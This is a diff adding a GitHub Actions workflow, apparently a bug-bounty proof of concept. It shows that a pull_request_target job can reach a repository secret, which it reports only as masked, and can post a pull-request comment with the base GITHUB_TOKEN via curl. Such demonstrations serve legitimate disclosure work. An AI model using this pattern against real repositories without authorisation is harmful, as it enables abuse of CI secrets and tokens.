@@ -1,0 +1,38 @@
+name: PR Target Secret Validation PoC
+
+on:
+  pull_request_target:
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  validate-context:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout PR code (vulnerable behavior)
+        uses: actions/checkout@v4
+
+      - name: Check if TEST_HACKERONE secret is accessible
+        run: |
+          if [ -n "${TEST_HACKERONE}" ]; then
+            echo "TEST_HACKERONE is accessible (value masked)"
+          else
+            echo "TEST_HACKERONE is NOT accessible"
+          fi
+        env:
+          TEST_HACKERONE: ${{ secrets.TEST_HACKERONE }}
+
+      - name: Prove base-repo GITHUB_TOKEN context by commenting on PR
+        run: |
+          PR_NUMBER="${{ github.event.pull_request.number }}"
+
+          curl -s -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/${{ github.repository }}/issues/${PR_NUMBER}/comments \
+            -d '{
+              "body": "✅ Security validation: This comment was created using the base repository GITHUB_TOKEN via pull_request_target."
+            }'
